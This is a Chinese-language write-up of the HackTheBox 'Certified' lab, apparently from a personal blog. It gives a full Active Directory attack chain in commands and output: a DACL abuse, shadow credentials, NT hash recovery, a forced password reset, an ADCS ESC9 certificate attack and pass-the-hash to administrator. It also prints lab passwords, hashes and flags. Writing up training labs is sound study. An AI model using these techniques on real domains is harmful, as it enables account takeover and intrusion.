---
title: '[htb] Certified'
date: 2024-11-30 0:11 +0800
categories: [hack,HackTheBox]
tags: [windows]
---

## information

```shell
╭─bamuwe@Mac ~
╰─$ nmap -sVC 10.10.11.41 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-30 00:01 CST
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 43.85% done; ETC: 00:03 (0:00:58 remaining)
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 43.90% done; ETC: 00:03 (0:00:58 remaining)
Nmap scan report for 10.10.11.41
Host is up (0.11s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-29 22:49:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-29T22:51:07+00:00; +6h46m14s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-29T22:51:08+00:00; +6h46m14s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-29T22:51:08+00:00; +6h46m14s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-11-29T22:50:31
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h46m13s, deviation: 0s, median: 6h46m13s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.23 seconds
```

发现域名 `certified.htb` 

![image-20241130002332994](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241130002332994.png)

## user1

- **user1: judith.mader / judith09**

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ crackmapexec smb certified.htb -u 'judith.mader' -p 'judith09' --rid-brute|grep 'SidTypeUser'
SMB         10.10.11.41     445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
SMB         10.10.11.41     445    DC01             501: CERTIFIED\Guest (SidTypeUser)
SMB         10.10.11.41     445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
SMB         10.10.11.41     445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
SMB         10.10.11.41     445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
SMB         10.10.11.41     445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
SMB         10.10.11.41     445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
SMB         10.10.11.41     445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
SMB         10.10.11.41     445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
SMB         10.10.11.41     445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
```

![image-20241130134814845](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241130134814845.png)

> Bloodhound 截图

存在writeowner权限。

赋予judith用户WriteMembers权限

```shell
╭─bamuwe@Mac ~
╰─$ dacledit.py -action 'write'  -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0.dev0+20241127.154729.af51dfd - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20241130-134412.bak
[*] DACL modified successfully!
```

```shell
╭─bamuwe@Mac ~
╰─$ dacledit.py -action 'read'  -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0.dev0+20241127.154729.af51dfd - Copyright Fortra, LLC and its affiliated companies

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-729746778-2675978091-3820388244-1103)
[*]   ACE[0] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : judith.mader (S-1-5-21-729746778-2675978091-3820388244-1103)
[*]   ACE[4] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : WriteOwner (0x80000)
[*]     Trustee (SID)             : judith.mader (S-1-5-21-729746778-2675978091-3820388244-1103)
```

把judith用户添加到managerment组

```shell
╭─bamuwe@Mac ~
╰─$ bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" add groupMember "Management" "judith.mader"
[+] judith.mader added to Management
```

![image-20241130205923313](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241130205923313.png)

> 修改后的权限

这也是一个攻击手法，但是不会，纯在复现

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ pywhisker  -d "certified.htb" -u "judith.mader" -p 'judith09' --target "management_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 06077336-df02-cb96-7322-84843041204a
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: Woyaww2z.pfx
[*] Must be used with password: Mt5JyQxmQyfKPM9PKCUw
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```



```shell
╭─bamuwe@Mac ~/tools/PKINITtools ‹master●›
╰─$ ./gettgtpkinit.py certified.htb/management_svc -cert-pfx ~/Desktop/Woyaww2z.pfx -pfx-pass 'Mt5JyQxmQyfKPM9PKCUw' ccache
2024-11-30 21:43:26,956 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-11-30 21:43:26,998 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-11-30 21:43:51,495 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-11-30 21:43:51,495 minikerberos INFO     974e38599be234ebb81d4c98b90b0408bcbf319db05a54b6935c58aee5fdddb7
INFO:minikerberos:974e38599be234ebb81d4c98b90b0408bcbf319db05a54b6935c58aee5fdddb7
2024-11-30 21:43:51,503 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```shell
╭─bamuwe@Mac ~/tools/PKINITtools ‹master●›
╰─$ export KRB5CCNAME=/Users/bamuwe/tools/PKINITtools/ccache
╭─bamuwe@Mac ~/tools/PKINITtools ‹master●›
╰─$ python3 ./getnthash.py certified.htb/management_svc -key 974e38599be234ebb81d4c98b90b0408bcbf319db05a54b6935c58aee5fdddb7
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
/Users/bamuwe/tools/PKINITtools/./getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/Users/bamuwe/tools/PKINITtools/./getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

## user2

- **user2: management / a091c1832bcdd4677c28b5a6a1295584**

```shell
╭─bamuwe@Mac ~
╰─$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>

*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
8821e6ba82b09f67ff0c942bc50289af
```

**userflag: 8821e6ba82b09f67ff0c942bc50289af**

![image-20241130220555552](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241130220555552.png)

> Bloodhound 截图

发现management_svc用户对于ca_operator用户拥有GenericAll权限。尝试修改密码：

```shell
*Evil-WinRM* PS C:\Users\management_svc\Desktop> net user ca_operator ca_operator /domain
The command completed successfully.
```

修改成功

```shell
*Evil-WinRM* PS C:\Users\management_svc\Desktop> net user ca_operator ca_operator /domain
The command completed successfully.
```

## user3

- **user3: ca_operator / ca_operator**

这里存在一个esc9的攻击手法。但是不会，纯看wp复现。以后再补充～～

```shell
╭─bamuwe@Mac ~
╰─$ certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```



```shell
╭─bamuwe@Mac ~
╰─$ certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```



```shell
╭─bamuwe@Mac ~/tools
╰─$ certipy req -username ca_operator@certified.htb -p ca_operator -ca certified-DC01-CA -template CertifiedAuthentication -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'CERTIFIED.HTB' at 'fe80::1%en0'
[+] Resolved 'CERTIFIED.HTB' from cache: 10.10.11.41
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.41[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.41[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```



```shell
╭─bamuwe@Mac ~/Desktop
╰─$ certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```



```shell
╭─bamuwe@Mac ~/Desktop
╰─$ certipy auth -pfx administrator.pfx -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

## system

```shell
╭─bamuwe@Mac ~
╰─$ evil-winrm -i certified.htb -u administrator -H '0d5b49608bbce1751f708748f67e2d34'                                                                                    1 ↵

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e2ad0b78493dea395e21cf2b4fa6d0e5
```



## conclusion

- Windows基础还是非常重要的，这个靶机就涉及到很多tgt？之类的凭据。
- 攻击手法也非常多样，这个靶机就涉及到两个攻击手法，或许能够总结一下。
